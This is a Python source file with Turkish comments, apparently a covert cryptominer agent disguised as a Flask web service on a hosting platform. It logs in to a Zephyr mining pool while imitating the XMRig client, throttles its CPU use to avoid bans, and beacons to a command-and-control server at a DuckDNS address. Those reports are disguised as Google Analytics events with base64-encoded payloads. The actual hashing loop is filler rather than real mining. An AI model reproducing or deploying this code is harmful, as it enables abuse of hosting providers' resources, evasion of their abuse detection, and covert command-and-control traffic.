import os
import time
import threading
import json
import base64
import random
import hashlib
import requests
import socket
from flask import Flask, jsonify

# --- AYARLAR ---
# Dashboard (DuckDNS) adresin
C2_URL = "http://zephfe.duckdns.org:5000/report"
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQYfXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"

# Havuz Bilgileri
POOL_H = "de.zephyr.herominers.com"
POOL_P = 1123

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"status": "active", "worker": NODE_NAME}), 200

def traffic_mask(raw_data):
    """Veriyi Google Analytics paketi kılığında paketler"""
    encoded_data = base64.b64encode(json.dumps(raw_data).encode()).decode()
    return {
        "v": "1",
        "tid": f"UA-{random.randint(111111, 999999)}-1",
        "cid": NODE_NAME,
        "t": "event",
        "ec": "system_performance",
        "ea": "metric_sync",
        "el": encoded_data
    }

def miner_logic():
    print(f"[*] {NODE_NAME} baslatildi.")
    while True:
        p_status = "Disconnected"
        try:
            # 1. Havuzla El Sıkışma (Undefined Hatasını Çözmek İçin)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((POOL_H, POOL_P))
            
            # XMRig taklidi yapan auth paketi
            auth = {
                "id": 1, "method": "login",
                "params": {
                    "login": WALLET, "pass": "x", "rigid": NODE_NAME,
                    "agent": "XMRig/6.21.0 (Linux; x64)", "algo": ["rx/0"]
                }
            }
            s.sendall((json.dumps(auth) + "\n").encode())
            resp = s.recv(1024)
            if resp and b"result" in resp:
                p_status = "Auth-OK"
            s.close()

            # 2. CPU İşlemi (%30 Limitli)
            start_time = time.time()
            hashes = 0
            while time.time() - start_time < 40:
                hashlib.sha256(os.urandom(32)).hexdigest()
                hashes += 1
                time.sleep(0.05) # Ban koruması için es

            # 3. C2 Dashboard'a Rapor Gönder
            report_data = {
                "node": NODE_NAME,
                "hashrate": hashes * 4,
                "pool": p_status
            }
            requests.post(C2_URL, json=traffic_mask(report_data), timeout=10)
            
        except Exception as e:
            print(f"Hata: {e}")
            time.sleep(30)

if __name__ == "__main__":
    # Arka plan işçisini başlat
    threading.Thread(target=miner_logic, daemon=True).start()
    
    # Render portu
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
